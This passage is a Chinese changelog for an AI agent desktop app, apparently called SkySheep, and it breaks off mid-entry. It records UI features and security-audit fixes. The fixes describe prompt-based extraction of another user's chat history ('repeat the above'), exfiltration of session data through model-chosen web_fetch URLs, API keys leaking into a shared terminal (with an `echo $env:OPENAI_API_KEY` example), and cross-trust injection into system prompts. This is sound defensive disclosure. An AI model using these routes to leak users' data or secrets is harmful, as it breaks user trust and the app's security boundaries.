# Changelog

本项目的所有重要变更记录于此。格式参考 [Keep a Changelog](https://keepachangelog.com/zh-CN/1.3.0/)。

## [2.0] - 2026-09-26

### 新增

- **自动压缩上下文可开关、触发比例可自定义**：长对话的自动压缩此前恒开
  （固定占用 90% 触发），现在 设置 · 高级 · 运行参数 新增「自动压缩长对话
  历史」开关（默认开），并连同已有的「压缩触发比例」「压缩保留条数」成组
  排列——开关关闭后引擎不再自动压缩，仅手动执行 /compact 时压缩，触发比例
  （50–98%）在占用达到上下文上限的该比例时生效。保存后对所有活着的会话
  立即热生效，无需重启；开关关闭时比例与条数两个输入框置灰示意。

- **空白会话欢迎卡统一出现 + 设置开关**：欢迎卡片（「欢迎使用」与示例任务）
  此前只在部分入口出现——新建会话有、从侧栏点开旧的空会话没有（懒加载路径
  漏了欢迎页兜底）。现在两条会话打开路径统一：只要会话里还没有消息就显示
  欢迎卡。并在 设置 · 界面与通知 新增「空白会话欢迎卡」开关（默认开，偏好存
  ui.json 的 welcome_card 键）：关闭后空白会话保持空白，开关即时作用于当前
  看着的空白视图，偏好自动保存、重启保持。

- **文件面板预览区高度可拖动调整**：文件树与预览区之间新增分隔条，上下拖
  即改预览区高度（只读/可编辑两档都生效），高度记进 ui.json（files_preview_h）
  重启保持；双击分隔条恢复默认档。分隔条只在有文件打开时出现，默认高度不变。
  拖动时只移动一条提示线、松手才落位——大文本的 textarea 每改一px高度都要
  整块重排，边拖边改会卡成一下一下的跳动。

- **记忆地图：把每个项目的演化画出来**。右侧面板新增「记忆地图」标签（侧栏与
  折叠窄栏同步入口），打开即见当前项目的演化时间线：会话按月铺成星轨（圆点
  大小按 token 投入分档，点击直达会话，归档/分叉各有标记），任务清单的创建与
  完成、流水线跑完、定时任务最近一次运行、全局记忆新增条目都以轻量行标注在
  对应日期；底部常驻两块小仪表——「文件足迹」（检查点记录里改动最多的文件
  chips，点击只看涉及它的会话）与「活跃热力图」（GitHub 贡献图式的按天格子，
  悬停看当日会话数与 token）。时间线之外还有「图谱」视图：阶段、主题、文件、
  记忆四类节点连成关联网络（自写力导向布局，不引第三方库），悬停高亮邻域、
  点击直达会话）、图谱节点悬停即出会话浮层（可移入浮层点开成员会话）且可拖拽。全部配色走主题变量，六套主题通吃。

- **演化摘要：让模型替你写「项目走到哪了」**。地图页一键「生成演化摘要」：
  后台用当前模型通读项目会话史（时间正序的会话流水 + 各会话摘要/标签/用量，
  上限 200 会话），总结出一段项目总览和 2–5 个演化阶段（每段带标题、摘要、
  要点与主题词，并映射回覆盖的会话），落库后以里程碑卡与图谱节点呈现；完成
  或失败都会通知提醒，失败可直接重试。也可以打开「自动」开关，项目累计足量
  新会话（默认 24 小时冷却 + 8 个新会话）时后台自动补一次。摘要在 设置 之外
  不产生任何文件写入与命令执行，只调模型与本地库。

- **项目演化的聚合查询与第 14 张表**。会话库新增 `map_digests` 表保存演化
  摘要（按项目整体替换，重新总结即整体作废旧阶段），配套三个聚合查询：带
  消息数与 token 的会话时间线（含已归档）、按天的活跃度、任务/流水线/定时
  任务的事件流；检查点新增项目级元数据扫描（文件足迹的数据源）；全局记忆
  条目解析为带日期的列表供地图标注。新增 WS 方法 `map.get`（只读）、
  `map.generate`、`map.save_config`，其中跨项目查看与其他项目枚举面同一
  安全口径，仅限本机桌面端；配置节 `[memory_map]`（`auto_digest`，默认关）
  与其他设置页同一套读写路径。

### 变更

- **- **vendor 第三方库补录版本并更新（2026-09-25 审查遗留项闭环）**：mermaid 更新到
  11.17.2、@xterm/xterm 5.5.0、@xterm/addon-fit 0.10.0（原文件版本不可考），全部从
  jsdelivr 固定版本 URL 拉取，版本/来源/sha256 补进 vendor/README.md 的溯源表；
  刻意不跟跨大版本（mermaid 12 / xterm 6，API 兼容未验证）。夹具页实测图表渲染与
  终端全局符号正常。

### 修复

- **活跃热力图拉宽窗口后中间不再空一块**：热力图此前固定铺最近 26 周、格子
  固定 9px，而网格容器随底栏撑满，窗口拉宽后富余宽度全堆在格子与右侧图例
  之间，看起来像缺了一段。现在周数按底栏实际宽度自适应（26~260 周，上限与
  后端 MAP_HEAT_WEEKS 对齐），拉伸窗口、收展侧栏即重铺（ResizeObserver 防抖，
  周数没变不重铺）；后端把热力天数与时间线的查询窗口解耦、始终备足到上限
  跨度（map.get 的 days），多铺出来的远端周不会把「没查到」画成假「无活动」。
  网格另加 min-width:0——flex 项默认收不小于内容宽，容器收窄后量到的可用
  宽度会卡在旧格数上，周数只能涨不能缩，多出的列还会把右侧图例挤出屏。
  格子恒完整：周数预算多留 2px 亚像素冗余（clientWidth 取整与设备像素换算
  可能让内容超宽零点几像素，末列被裁一条边），并把本周没到的几天补成空格、
  从本周周一往前铺满整周数——整图恒为规矩矩形，不缺角不裁边。窄底栏也不再
  硬铺 26 周：能放几列放几列（最少一列），窄就少铺历史，绝不裁格。

- **时间线范围「全部」真的全部了**：地图页范围选「全部」此前与「近 90 天」
  无异——前端对 0 不发 start_ts，后端又把缺省窗口定为近 90 天（且显式 0 会
  被 `or` 缺省吞掉）。现在「全部」显式发 start_ts=0，后端把显式 0 解释为
  不限起点（负数夹回 0，非法值仍回缺省窗口），90 天前的会话与事件按月铺回
  时间线。

- **主题图谱悬停与拖拽手感**：节点不再同时弹原生系统提示与自绘浮层两份内容
  （去掉 title 属性，信息以浮层为准）；鼠标移开后浮层 100ms 即收（原 300/200ms
  的延迟读着像卡顿，100ms 仍够把鼠标挪进相邻浮层点会话链接）；拖拽补上抓取
  点相对节点中心的偏移——节点是中心锚定，此前起手瞬间中心被直接搬到指针下，
  看着像自己跳了半个身位。

- **文件面板打开大文件不再卡住**：预览上限原为 400KB，194KB 的源码会整个塞
  进编辑框——大文本在单个 textarea 里，前端每个按键、每次滚动都要整块重排，
  输入卡成幻灯片。上限降为 100KB：限内文件照常可编辑；超限只载前 100KB 并
  转只读，标题标「文件过大已截断」，看全文走「打开」用系统编辑器。

- **预览标题不再把按钮挤出面板**：标题行（路径 + 大小 + 编码/行尾 + 只读
  原因）超长时会把「保存 / 打开 / 关闭」顶出面板右缘，裁掉半个按钮。现在
  标题自己收缩、超长省略号收尾，悬停可看全文，按钮恒完整可见。

- **辅助对话对远程调用改为无状态（2026-09-25 审查 P1-3 收口完成）**：共享的
  aux 历史是本机侧栏面板的语义——此前持令牌的局域网/远程用户问模型一句
  「重复上面的内容」就能套出本机用户在辅助面板里问过什么，其提问也会写进
  本机面板。现在远程调用使用一次性历史（模型只看到 system + 本条消息，
  结果带 stateless 标记），本机调用语义完全不变。
- **工作区信任新增「轮次起点重验」与重连接信任门（2026-09-25 审查 P2-4/P2-5）**：
  信任此前只在启动/切项目时求值，会话运行期间项目级配置被 git pull 等外部改动后，
  已连的项目级 MCP 会保持连接、load_skill 照读新正文。现在每轮对话开始时重验一次：
  发现「曾信任过、配置已变」就按撤销同款差量收口（断项目级 MCP、重发现技能）；
  MCP 断线自动重连也加了放行门——项目级服务器在信任失效后不再按内存里的旧配置
  被悄悄拉起（显式撤销的收口路径不受影响）。
- **旧格式信任记录不再被「装技能顺手全量洗白」（2026-09-25 审查 P2-6）**：
  1.9 前的信任记录没有逐来源哈希，装技能/存配置触发的刷新会把其它来源的变更
  （可能正是 git pull 带进来的）一起延续信任。现在旧格式记录只有内容完全未变
  才延续（并顺带升级成新格式）；有变化就保持待确认，请用户重新点一次信任。
- **引擎自身数据目录（~/.skysheep）内的写入永远逐次确认（2026-09-25 审查 P2-7）**：
  白名单沉淀的 write_file「整工具 always 规则」此前可以免确认写全局技能目录与
  config.toml——全局技能会注入所有项目（含未信任项目）的系统提示词，等于沉淀出
  一条跨信任边界的自由写入面。现在 authorize 对落点在引擎主目录内的写入一律
  退回逐次确认，「总是允许」也只固化当次参数（不再产出永不生效的死规则），
  确认弹窗的说明同步更新。
- **web_fetch 三处加固（2026-09-25 审查 P2-8/P2-9/P1-2）**：带 userinfo 的 IPv6
  字面量 URL（如 https://user:pass@[::1]/x）剥凭据后不再触发 AttributeError，
  改为可读的内网拒绝提示；DNS 解析（getaddrinfo）挪进线程池——慢 DNS 不再把
  整个事件循环（所有会话/渠道/工具）停摆在原地；每次外发在结构化日志里留一条
  「去了哪」（仅 host/path 与 query 长度，不含 query 本体，避免随诊断包二次泄漏）。
- **MCP 远程地址预检加内网防护（2026-09-25 审查 P2-10）**：远程 MCP 的连接前
  快速体检此前对任意地址都做裸 TCP 探测——口径与 web_fetch 不一致。现在非回环
  目标必须解析为公网地址（复用同一份校验，含 NAT64/6to4 翻译段），回环地址放行
  （本机 MCP 是最常见形态）；连接失败的错误文案不再带底层异常细节，避免内网
  拓扑经状态接口回显到局域网界面。
- **渠道配置保存后门控立即生效（2026-09-25 审查 P2-11）**：改「审批开关 / 允许
  工具名单」此前要等新渠道会话（或重启）才对已存在的渠道会话生效。现在保存/
  启停后立即刷新空闲渠道会话的门控（正在跑的轮次不动，避免丢掉在等的审批）。
- **渠道侧信息面三处收紧（2026-09-25 审查 P3-14/P3-15/P3-17）**：/sessions 只列
  「远程连接」项目的会话（桌面当前项目的会话标题不再透给渠道侧），/status 的
  项目名同步固定；审批卡片固定回「发起这一轮的消息所在聊天」，不再被其它名单内
  聊天的后续消息带偏；审批回复的发起人校验改为严格相等——任何一侧缺 id 一律
  不生效（原「两侧都为空退回旧行为」的口子关闭；现平台飞书/微信恒带 id，不受影响）。
- **run_command 的 kill 固化带进程号（2026-09-25 审查 P3-16）**：白名单此前固化
  的 "action=kill" 精确规则等于放行「杀本会话任意后台进程」；现在固化带上当次
  进程号，杀别的进程会重新询问。
- **app.open_external 远程调用不在服务端代开（2026-09-25 审查 P1-3 收口）**：
  局域网/远程访问时该接口把 URL 原样交回客户端（remote 标记），由远端自己的
  浏览器打开——持令牌设备不再能让别人桌面弹任意网页。前端反馈页流程同步适配。
- **主文档启用完整 CSP（2026-09-25 审查 P3-21）**：主页响应新增
  Content-Security-Policy——脚本只认自身文件与首帧主题脚本的内容哈希，禁止内联
  脚本与外源代码；样式放行内联（渲染器/高亮所需），iframe 面板保留打开外部网页
  的能力；/preview 等其它响应维持仅 frame-ancestors（预览的是用户项目 HTML，
  不能套本应用的脚本白名单）。已在浏览器实测主题、对话、权限卡、渲染全部正常。
- **终端面板不再整体继承环境变量，输出不再推送远程连接（2026-09-25 审查 P1-1）**：
  此前 `TerminalSlot.spawn` 不传 env，ConPTY 子进程整体继承 `os.environ`——
  `*_API_KEY`/`*_TOKEN` 等密钥变量原样进入常驻 PowerShell，终端里回显即可读走；
  而 `term_data`/`term_exit` 事件广播给全部 WS 连接，局域网模式下的持令牌设备
  能被动收到本机终端全部输出（含用户敲的 `echo $env:OPENAI_API_KEY`）。现在
  spawn 走与 run_command 同一份 `child_environment()` 剥敏口径（公共函数自
  `tools/shell.py` 导出，run_command 三处调用点同步切换），非本机连接在 emit
  过滤层直接丢弃终端事件。
- **六个方法收敛为本机专属（2026-09-25 审查 P1-3）**：`app.notify`（远程弹桌面
  toast）、`fs.open`（配合 fs.write 可让远程内容在本机被默认程序打开）、
  `term.close`（远程杀本机终端 shell；`term.stop` 是收紧向维持远端可）、
  `memory.get`（全局记忆全文）、`model.switch`（切当前对话模型）——全部加入
  `LOCAL_ONLY_METHODS`，持令牌的局域网/Tailscale 客户端不再能调用；「本机专属
  方法」回归清单（tests/test_local_only_methods.py）同步收编。
- **web_fetch 加 URL 长度上限与用途约束（2026-09-25 审查 P1-2）**：该工具只读
  自动放行、URL 由模型任意指定，不加约束等于开放一条「把会话内容拼进 query
  外带」的免确认通道。现在 `url` 参数层拒绝总长超 2048 的地址，工具描述明确
  「单向抓取、禁止把会话/文件内容拼进 URL」。

## [1.9] - 2026-09-24

### 变更

- **「本机现存」候选面板移到技能列表上方，并可随手收起**：以前面板排在技能列表
  之后，而列表吃满卡片剩余高度，面板总是被压到页面最底部——右下角桌宠恰好盖住
  底部内容，且面板没有任何关闭入口，只能「← 返回」离开整个技能页。现在面板
  平铺在列表上方（点开就在页首可视区，列表自动让位），工具条右端新增「收起」
  按钮；再点一次「本机现存」也等效收起，展开时自动滚到面板顶部。

- **技能页状态提示会自动消失了**：成功类提示（已导入 / 已删除 / 范围已更新等）
  6 秒后自动收起，不再一直挂在页首；错误提示保留，留时间读原因，直到下一次
  操作覆盖。导入成功的点名名单同步截短——只列前 6 个名字 + 「等 N 个」，
  批量导入 78 个技能时不再把整个名单刷成半屏长文。

- **修复：鼠标悬停「全选」工具条时与首行内容重叠**：批量删除工具条是列表里的
  粘性行，悬停会命中通用行 hover 规则——而那套底色是半透明的，盖在滚到工具条
  底下的首行上就把那行透了出来。现在工具条悬停保持原本的不透明底色，不再透出
  下一行。

- **「导入到任务编排」新增「新建任务」来源**：以前只能纳入已有的定时任务 /
  任务簿任务 / 会话 / 导出文件，想排一个全新任务得先绕道别处建出来。现在弹窗
  第一项就是「新建任务（直接写指令，就地排进流水线）」——写清要做什么即可放进
  新流水线或追加到已有流水线（新 WS 方法 `pipeline.add_task`，与「已有会话」
  同样无人值守、按节点预授权名单执行；新建节点名单为空，只读放行，其余到面板
  里逐节点补）。已列入本机操作名单，局域网/远程连接不能触发。
  顺带修掉该弹窗「安全说明」段落的参差左缘：模板字符串里的换行缩进被 HTML
  折叠成空格，恰好落在自动换行处就把第二行顶凸了——现在写成单行。

- **任务编排节点编辑行的小控件统一成主题外观**：「失败自动重试 / 最多迭代 /
  超时」三个数字框与「普通任务 / 满足方式」两个下拉此前是 WebView 原生样式
  （白底细边、高度参差，宽度也各自为政——重试 52px、超时吃原生默认宽度），
  和同卡片里节点名 / 指令两个 `.modal-input` 大框放在一起明显突兀。现在统一成
  同款纸面外观（同底色 / 边框 / 圆角 / 字体），行内紧凑尺寸，三个数字框同宽。

- **成功类状态提示全站自动消失**：技能页先行的「6 秒后自动收起」推广到全部
  设置页——模型服务、MCP、记忆、语音输入、子代理、钩子、高级、记忆整理等处
  的「✓ 已删除 / 已保存 / 已切换…」都是一次性确认，现在到点自动收起，不再
  一直挂在页首；「✗ 失败」类提示保留，留时间读原因，直到下一次操作覆盖。
  实现收拢为统一的 `autoHideStatus`（计时器挂在状态栏元素上，同一函数管
  多条状态栏时互不干扰）。

- **修复：侧栏手动拖动排序自引入起从未生效**（分组视图项目、两种视图的会话
  全部中招，仅经典视图的项目行幸免）。三处各自独立的病因：
  ① 分组视图组头的提交把「落点位置」当成「目标组」传给了
  `commitProjectOrder`，`indexOf` 必然落空直接早退，保存从未发生；
  ② 组内会话的同家族判定拿「被悬停行自己的家族」与它自己比较（恒相等），
  拖动源家族从未参与判定，悬停响应永远返回 null；
  ③ 经典视图的会话拖动漏传 `view="classic"`，提交按分组视图的
  `.pgroup-head` 沿 DOM 收集会话，经典视图里一个都找不到。
  已逐一修复并用真实服务在浏览器里对四种拖拽路径（分组组头 / 分组会话 /
  经典会话 / 经典项目）逐一实测：拖动后顺序立即生效且写入 `ui.json`
  （`project_order` / `session_order`），重载后保持。

- **右侧面板合并同类标签：12 格菜单收成 9 格**：「子代理任务 / 任务清单 /
  项目任务」三个都是清单却各占一格，看不出区别；「定时任务 / 任务编排」也同属
  「不用盯着、自己会跑」的配置。现在合并成两个带分段切换的标签——
  **任务**（子代理任务 · 任务清单 · 项目任务）与**自动化**（定时任务 · 任务编排），
  原页面、原数据、原操作一个不少，只是不再各占一格菜单。侧栏与窄栏的
  「任务清单 / 项目任务 / 定时任务 / 任务编排」入口点进去直接落在对应分段，
  不因为合并多一步点击；「＋」菜单、标签标题与提示同步更新。升级时旧
  `ui.json` 里的分段 id（`todo`/`cron`…）会映射回所属标签并还原到原来那一段，
  偏好白名单也补齐了此前漏收的 `ptasks`/`pipeline`（旧版本下这两个标签重启后会
  静默丢失）。

- **「新建会话」原则统一：点击即在当前高亮的项目下新建一个会话**：移除「当前
  标签还没发过消息就连点复用」的防抖——侧栏「＋ 新建会话」/ Ctrl+N / 标签栏＋ /
  组头与项目行＋，每次点击都立即落库一个新会话并打开新标签（落点仍按「点哪行
  亮哪行」：高亮哪个项目/快聊就建在哪）。连点会留下多个空会话，交给侧栏底部
  「清理空会话」兜底；启动恢复仍保持懒创建（发首条消息时才落库）。

- **快聊列表去掉空态文案**：无快聊对话时不再显示「还没有快聊对话——点项目区
  「快聊」行的＋新建一个」这行提示（入口就在项目区「快聊」行上，不必再教一遍）；
  列表为空即留白。远程连接等其他列表的空态提示照旧。

- **归档弹窗：方框长宽固定 + 批量选择**：弹窗尺寸固定（560×520，视口小按
  82vh 收敛），条目再多也不撑高弹窗、内容在列表区自己滚；列表上方新增批量
  操作条——全选、已选计数、「恢复所选（N）」「删除所选（N）」；批量删除沿用
  单行那套「确认删除」两步确认，勾选一变即要求重新确认。单行的恢复/删除
  按钮照旧，操作后计数与全选态自动同步。

- **技能页移除「技能广场」区块，技能列表铺满整页**：设置 · 技能与工具 的
  详情页不再有技能广场卡片（折叠浏览/安装入口、渲染逻辑与其样式一并移除；
  后端链路同版一并下线，见下方「移除」）。上方技能卡与列表改为吃满剩余高度：
  卡片铺到设置体底部，列表在卡片内自己滚（技能多少都不再留半页空白），
  右面板复用同一节点时仍按 420px 上限显示、不撑爆面板。技能总览文案里
  「逛技能广场」的指路同步去掉。

### 修复

- **应用内一键更新其实从未真正安装（1.8 起，所有安装版）**：更新助手此前把
  「延迟 → 静默安装 → 记录退出码」拼成一条命令串交给 `cmd /c`（Popen 传列表参数），
  Python 会把串里的引号转义成 `\"`，而 cmd.exe 不认反斜杠转义——安装包路径、`/LOG=`
  与退出码重定向整段被解析坏（报「文件名、目录名或卷标语法不正确」），安装器根本
  没启动：日志里只剩一行头部、版本原样不动，表现为「点了更新、应用退出后再没下文」。
  现在助手落成 `apply-update.cmd` 再以相对名执行（批处理内引号按 cmd 规则原样生效，
  路径含空格/中文也安全），并补「安装包不存在」的显式失败行便于事后对账。
  回归测试改为**真实执行一遍批处理**并断言退出码回写（旧测试只断言命令串形状，
  所以一直没发现）。
- **「一键更新」不再让人错过 UAC**：本机安装登记在 HKLM（「为所有用户安装」）时
  安装器必须提权，而应用先退出、界面提示看不清。现在 `app.install_update` 返回
  `uac` 标记，前端在退出前把「稍后会弹出系统授权窗口，请点『是』」讲清楚，并在退出前
  补发一条系统通知（停在通知中心，应用关了也看得到）。

- **归档会话不再自动弹回一个新标签**：归档/改名/移动等操作的后端广播
  （`session_updated`）带 session_id，前端多会话路由对「没有打开标签的
  会话」一律后台补开一张标签——于是归档一个当前没开着标签的会话，它会
  立刻以「会话」标签原样弹回标签栏。现在元数据广播只更新缓存与侧栏列表，
  不再建标签；轮次事件（其他窗口/手机端发消息）的自动跟签行为不变。

- **归档会话时标签栏的标签跟着收掉**：归档后侧栏行消失、上方标签原地不动，
  两边状态脱节（用户报的「左侧标签消失，上方标签没跟着消失」）。归档广播
  现在带 `archived` 标记，前端据此把该会话的标签 `closeTab` 一并收掉（与
  删除会话同一处置），标签集合与 ui.json 的恢复列表经 renderTabs 同步写回，
  重启不会把归档标签还原；恢复归档后从归档弹窗重新点开即可。

- **微信扫码确认后拿不到 bot_token 的根因修复（对齐官方协议形状）**：确认响应的
  bot_token / baseurl 在**顶层**（官方 npm 包 `@tencent-weixin/openclaw-weixin`
  login-qr.ts 的 `StatusResponse` 接口），此前适配器去 `credentials` 包层里找——那是
  官方文档页另一套 API 的形状，实测不存在，导致扫码在手机上确认成功后永远报
  「没有拿到 bot_token」。现在顶层优先、credentials 兜底，拿不到时把脱敏响应记入
  日志便于排障；并补齐官方轮询的其余状态：`scaned_but_redirect`（IDC 迁移）按
  `redirect_host` 换主机继续轮询、每次生成新码先重置回固定接入点；
  `need_verifycode` 风控配对码——界面出现输入框，把手机微信上显示的数字经
  `verify_code` 参数带回重试、输错有明确提示；`verify_code_blocked`（错太多次）
  按过期换新码处理；`binded_redirect` 明确提示「该微信已连接过此机器人，无需重复
  扫码」而不再空转。

- **微信扫码登录不再把接口报错伪装成「等待扫描」**：轮询返回 `error` 状态时（二维码失效、
  服务器报错等），此前前端没有对应分支，界面一直显示「等待扫描…」并以 1 秒间隔无限重试，
  真实失败原因永远不展示，用户表现为「扫了码也没反应」。现在报错会亮出具体原因并停止轮询；
  二维码过期改为自动换新码继续等（连续 3 次封顶、手动重新生成即恢复额度，检测到扫描即清零，
  设置页已关掉就不再后台空转）。

- **会话操作体系专项检查（审计后的十处修复）**：
  - **删除项目现在真正级联清理定时任务与流水线**：`store.delete_project` 此前只删
    会话/消息/白名单/任务清单，`cron_tasks` 与 `pipelines`/`pipeline_nodes` 留成孤儿——
    到点扫描仍会捞到已删项目的任务，执行上下文兜底把它挂到「当前项目」的工作目录
    与白名单下继续跑（会话、文件改动全部落错项目）。现与 `delete_project` 的文档
    声明对齐一并删除；该项目的检查点目录（改前文件快照）也整目录清除。
  - **删除会话不再残留检查点**：检查点（用户文件的改前字节快照）此前随删除
    永久留在磁盘与索引里，靠条数淘汰慢慢蒸发。新增 `CheckpointStore.forget_session`，
    删会话时连内存索引带磁盘目录一起清。
  - **检查点三处数据安全加固**：`bytes` 写进 meta.json（旧 meta 按 blob 实际大小
    补算）——重启后全库字节上限不再失效；落盘失败（磁盘满等）不再释放内存副本，
    同进程内回滚仍然可用；blob 丢失不再按「改前不存在」处理——那会让「撤销本轮
    改动」把用户现存的文件删掉，现在只是该文件回滚不了。
  - **删除带排队消息的会话/移出会话不再挂死请求**：排队轮随 runtime 丢弃时其
    Future 永不 resolve，发消息的请求永久等不到响应。现在逐个 `fail` 给出
    「会话已删除/已移出」的明确错误；删除时还先等被取消的轮次收尾（含 shield
    保护的落库）跑完再删行，不再留下孤儿消息行。
  - **WS 连接的会话跟踪对 session.delete 生效**：跟踪逻辑按返回里的 `id` 更新，
    删除的返回从来没有这个键——删掉活跃会话后连接仍挂在已删会话上，收不到
    后续子代理等定向事件。现在删除跟随 `new_active`；truncate 返回补 `id`。
  - **运行中的会话拒绝分叉与检查点回滚**：与 truncate 同一守卫——消息是轮末
    批量落库的，运行中分叉会复制到不完整的历史，运行中回滚会往 runtime 追加
    系统提示并被轮末落库重复插一遍。
  - **跨窗口同步补齐**：`session_updated` 广播此前只有改名有，置顶/归档/移动/
    打标签/删除都不发——另一窗口的侧栏与标签保持陈旧状态。五处操作全部补发；
    前端处理器只带标题时才覆盖缓存（拿空串覆盖会把标签名抹白），`deleted` 广播
    关掉对应标签；顺带修掉 `schedule_reminder` 分支缺 `break` 穿透的隐患。
  - **「编辑标签」功能找回入口**：标签弹窗与后端 `session.tags` 一直都在，但
    `editSessionTags` 没有任何调用点——整个标签功能在界面上不可达。会话菜单
    （⋯/右键）补「编辑标签」与「取消归档/归档会话」两项（归档弹窗空态提示声称
    菜单里有归档，此前与事实不符）。
  - **移动会话支持移入快聊**：后端 `project_id=None` 一直支持，弹窗没给入口。
  - **零碎口径**：重命名/预命名限长 80 字（与自动标题/分叉的限长并存，超长
    标题不再撑爆侧栏）；空会话角标口径与清理对齐（置顶的不计入）、归档的空
    会话不再被清理顺手删掉；LIKE 兜底搜索转义 `%`/`_`（搜「100%」不再变成
    前缀匹配）；FTS 回填失败置脏，下次启动走查漏模式补回水位以下的洞；
    `restore_backup` 的恢复前安全副本先 checkpoint 收 WAL 再拷（WAL 里未
    合并的最近提交不再缺）；删会话同步清 `_manually_named` /
    `_default_model_sessions` 标记；侧栏重复点击当前会话不再反复弹「已恢复」。

- **信息与记忆管理专项检查（审计后的四处修复 + 一处遗留 bug）**：
  - **长会话压缩摘要不再混入思考内容**：`compact_history` 此前用 `hasattr(pe, "text")`
    收流式增量，思考型模型（DeepSeek R1 / Anthropic thinking）的 `ProviderReasoning`
    增量同样带 `text` 字段，推理文本被拼进压缩摘要——既浪费注入预算又污染事实。
    改为与归档提炼同一口径的 `isinstance(ProviderTextDelta)`。
  - **记忆注入超上限改为保最新条目**：条目按时间追加（新的在尾部），此前注入截断
    保留的是头部最旧条目、恰好丢掉最新的记忆，与文件容量护栏「丢最旧」方向相反。
    现在超 4000 字保尾部最新条目（按行边界），并在注入段落加一行说明，告知模型
    更早条目可用 `memory_write` 的 list 动作查看（静默截断会让模型把「没注入」
    当「不存在」）；设置页提示文案同步改为「只注入最近 N 字」。
  - **记忆文件全部改原子写**：`memory.md`（memory_write 工具 / 归档提炼 / 设置页保存）、
    `memory-maintenance.json`、整理备份 `.bak`、维护整理稿落盘此前都是直接
    `write_text`——写一半被杀会留下半截记忆且 `memory.md` 没有备份可回。统一改走
    `textio.write_text_atomic`（同安全审查 M13 家族）。
  - **消除归档提炼与定期整理的丢失更新竞态**：整理读旧稿 → 调模型的秒级窗口里，
    归档提炼可能已往 `memory.md` 追加新条目，按旧快照生成的整理稿直接覆盖会把它
    静默抹掉（该会话已标记提炼过，条目永久丢失）。新增 `_memory_io_lock`：提炼的
    追加、整理的落盘、设置页保存三处互斥；整理落盘前重读文件，内容对不上就让路
    （返回 `conflict`，不推进整理时间，下一轮巡检自动重试），手动「立即整理」
    会得到「已让路，稍后再试」的明确反馈。
  - **整理输出加列表结构守卫**：`clean_maintained_text` 此前只剥代码围栏，模型把
    记忆列表写成散文会直接覆盖落盘、破坏行格式（`(自动)` 标记与追加去重都失效）。
    现在原文含列表行而输出一条列表行都不剩时拒绝落盘。
  - **补上 `save_instructions` 漏掉的 `write_text_file` 导入**：上一轮 AGENTS.md
    编码/原子写改造把落盘换成 `textio.write_text_file` 但没加 import——设置页保存
    项目记忆（AGENTS.md）一落盘就 NameError。同批修复：`move_session` 引用未定义的
    `sess`（移动会话必 NameError），两处 lint 报错清零。

- **技能管理三处正确性修复**：
  - **全局/项目同名技能删错边**：发现时全局版遮蔽项目版，但删除候选根固定项目优先——
    用户看到的是全局版、静默删掉的却是被遮蔽的项目版，清单里的技能纹丝不动。现在按
    加载到的那份决定候选根顺序（`delete_skill`）。
  - **frontmatter 值支持 YAML 成对引号**：`name: "pdf-tools"` 此前引号原样进技能名，
    安装目录、load_skill 参数、清单显示全带引号。解析层剥一层首尾配对的引号
    （`_parse_frontmatter`）。
  - **发现跳过点开头目录**：`.git`、安装中断留下的 `.importing-*` 解压暂存残留不再被
    当成技能常驻清单（与安装扫描的过滤口径一致）；`skills.json` / `skills-scope.json`
    改原子写（中断不再丢整份停用名单 / 范围配置）。
- **MCP 管理/使用三处**：
  - **MCP 工具 schema 补齐 annotations 四注解**：`MCPTool.to_schema` 此前覆盖掉了基类的
    annotations 导出，服务器声明的 `destructiveHint` 等没有透传，外部宿主拿不到注解。
    现在 `read_only_hint` 用收窄后的最终判定（= 权限门口径），其余三项透传服务器显式值、
    未声明落保守缺省。
  - **编辑不再顺手启用已停用的服务**：表单没有「停用」字段，覆盖保存一个已停用的同名
    服务会把它重新启用并拉起（stdio 等于立即执行本机命令）。现在覆盖时保留停用状态
    （`save_mcp_server`）。
  - **`mcp.reconnect` 收进本机专属方法表**：全量重连会按已存配置重新拉起 stdio 命令
    进程，与「启动本机程序」同面，局域网持令牌设备不应能远程触发。

- **退出生命周期：`skysheep app`（终端 / 启动SkySheep.bat / `--browser`）不再误报「上次未正常关闭」**：
  这些路径此前置完 `should_exit` 就返回，daemon 服务线程被解释器直接掐断，uvicorn lifespan
  收尾（渠道 / MCP / 终端 / 数据库关闭、crash.flag 清除）根本没机会走——每次正常退出后，
  下次启动都提示「上次 SkySheep 未正常关闭（可能崩溃或被强杀）」。新增 `_stop_backend`：
  置退出标志后 join 服务线程等收尾真正走完（上限 5s，收尾卡住不拖退出）；桌面壳
  （desktop.py）退出同理改为 join（上限保持 1.5s，保证互斥体尽早释放）。
- **crash.flag 清理时机移到 `backend.shutdown()` 开头**：原在 lifespan 收尾最后一环，恰是
  最容易被截断的位置（桌面壳 1.5s 上限、程序内更新 `apply_update` 随后的 `os._exit(0)`——
  它直接调 `backend.shutdown()` 完全绕过 lifespan，更新重启后的首次启动也会误报）。
  现在清在各条退出路径的必经点、收尾一进来就清：已开始优雅收尾即不再是崩溃，
  真崩溃 / 强杀仍照常留下标记。
- **`skysheep app` 窗口模式改用固定 WebView2 profile**：`private_mode=False` + 实例数据目录下
  `webview-app/`（与桌面壳的 `webview/` 各用各的）。此前默认私有模式每次启动拿一个全新临时
  profile 且从不清理（每次启动往 TEMP 漏一个），浏览器环境每次从零初始化、首帧明显偏慢；
  桌面壳同款优化此前只落在 pyw/exe 路径。本路径无单实例互斥体，两个入口同开时不会争用
  同一个 profile。
- **随机端口预绑定后直接交给 uvicorn**：此前先 bind(0) 探端口再 close、由 uvicorn 重 bind，
  中间的小窗口被别的进程抢走端口时，会白等 60 秒才判「服务启动失败」。现在把预绑定的
  socket 直接传给 `server.run(sockets=...)`，占住不放，竞态消除。
- **桌面启动器卡死实例证据链①真实化**：`_find_main_hwnd` 刻意跳过无响应窗口（读卡死窗口的
  标题有同步卡点），导致 `_stale_holder_pid` 的「卡死窗口 → 按属主接管」分支在生产里永远
  不可达（仅测试桩可达）。新增 `_find_hung_sheep_hwnd`：按属主进程的镜像路径
  （`QueryFullProcessImageName`）认亲，全程不读标题、不发窗口消息；pid 记录进程的窗口已
  停转时不再等宽限期直接接管。卡死窗口属主与记录不符时绝不加速，仍按记录走宽限期
  （记录 + 创建时刻才是身份锚点，防 pid 复用误杀的口径不变）。
- **单实例互斥体创建失败留痕；`desktop.pid` 与 `window_state.json` 改原子写**：`CreateMutexW`
  失败时此前静默 fail-open（单实例悄悄失效，出现「双击两次开了两个」无从排查），现在写
  desktop.log；两份引擎自有状态文件改走 textio 原子写（临时文件 + replace），退出瞬间写到
  一半被强杀不再留半截文件。

### 修复

- **分组视图组头：整行折叠，＋新建对话（两种视图统一）**：组头右侧的折叠箭头
  移除，原位改为常显「＋」——点击即在该项目下新建对话（当前项目=新标签，
